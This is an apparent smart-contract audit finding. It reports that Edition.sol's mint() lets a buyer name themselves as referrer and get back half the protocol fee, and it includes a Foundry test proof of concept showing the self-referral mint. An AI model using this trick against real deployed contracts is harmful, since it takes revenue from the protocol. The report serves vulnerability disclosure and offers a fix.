# Users can mint tokens by paying half the fee

## Summary

Users can mint tokens by paying half the fee

## Vulnerability Detail

The contract `Edition.sol` has a `mint( )` function that lets users mint a token. It also allows users to add a `referrer_` address to split the protocol fee with.
A buyer who wants to mint an NFT can pay half the fee by mentioning their own address as the `referrer` address. This will give them back half of the protocol fee they paid. Therefore, **only paying half the fee to mint a token**

*Proof of Concept :*

<details>
<summary> testsuite </summary>

paste this in the `Edition.t.sol` testsuite

This test will give two scenarios where a minter does not specify the `referrer` address and specifies themselves as the `referrer` address

```javascript

function test_exploited_referrer() public {
        address alice = makeAddr("minter");
        vm.deal(address(alice), 0.0106 ether);

        console.log("[Balance-Before]");
        console.log("minter's balance : %e", address(alice).balance);
        console.log("protocol balance : %e", address(0xc0ffee).balance);
        console.log("creator's balance : %e", address(1).balance);

        //Alice calls mint with her own address as the referrer
        vm.prank(alice);
        edition.mint{value: 0.0106 ether}(
            address(alice),
            1,
            1,
            address(alice),
            new bytes(0)
        );

        console.log("[Balance-After]");
        console.log("minter's balance : %e", address(alice).balance);
        console.log("protocol balance : %e", address(0xc0ffee).balance);
        console.log("creator's balance : %e", address(1).balance);
    }

    //This is a simulation of how a mint tx would be if alice didnt add her own address as the referrer
    function test_no_referrer() public {
        address alice = makeAddr("minter");
        vm.deal(address(alice), 0.0106 ether);

        console.log("[Balance-Before]");
        console.log("minter's balance : %e", address(alice).balance);
        console.log("protocol balance : %e", address(0xc0ffee).balance);
        console.log("creator's balance : %e", address(1).balance);

        vm.prank(alice);
        edition.mint{value: 0.0106 ether}(
            address(alice),
            1,
            1,
            address(0),
            new bytes(0)
        );

        console.log("[Balance-After]");
        console.log("minter's balance : %e", address(alice).balance);
        console.log("protocol balance : %e", address(0xc0ffee).balance);
        console.log("creator's balance : %e", address(1).balance);
    }

```
</details>

Consider the price of the token to mint to be `0.01 ether` and the protocol fee is `0.0006 ether`
For the ease of the PoC let us assume the minter (alice) has only `0.0106 ether`
where `0.01 ether` is sent to the creator and `0.0006 ether` is sent to the protocol when there is no `referrer`
Once minted alice must have 0 balance.

But if alice mentions her own address as the `referrer` she gets `0.0003 ether` back as the `referrer`'s share allowing alice to pay only  half the protocol fee

## Impact

Since it can be done by anyone, the protocol would lose out on a lot of revenue made by fee.

## Recommendation

Add input validation for `referrer` address
